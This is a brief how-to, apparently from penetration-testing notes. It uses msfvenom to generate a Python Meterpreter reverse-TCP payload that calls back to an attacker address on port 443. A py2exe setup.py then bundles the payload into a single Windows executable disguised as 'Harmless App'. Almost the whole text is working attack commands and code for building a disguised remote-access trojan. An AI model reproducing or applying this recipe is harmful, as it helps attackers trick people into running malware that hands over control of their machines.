Payload

```
msfvenom -p python/meterpreter/reverse_tcp LHOST=10.0.2.10 LPORT=443 -f raw -o ~/Desktop/m.py
```

Now create setup.py

```
from distutils.core import setup
import py2exe
setup(
name = 'Harmless',
description = 'Harmless App',
version = '0.1',
console=['m.py'],
options = {'py2exe': {'bundle_files': 1,'packages':'ctypes','includes': 'base64,sys,socket,struct,time,code,platform,getpass,shutil',}},
zipfile = None,
)
```

Put both files in same folder and run

```
python.exe setup.py py2exe
```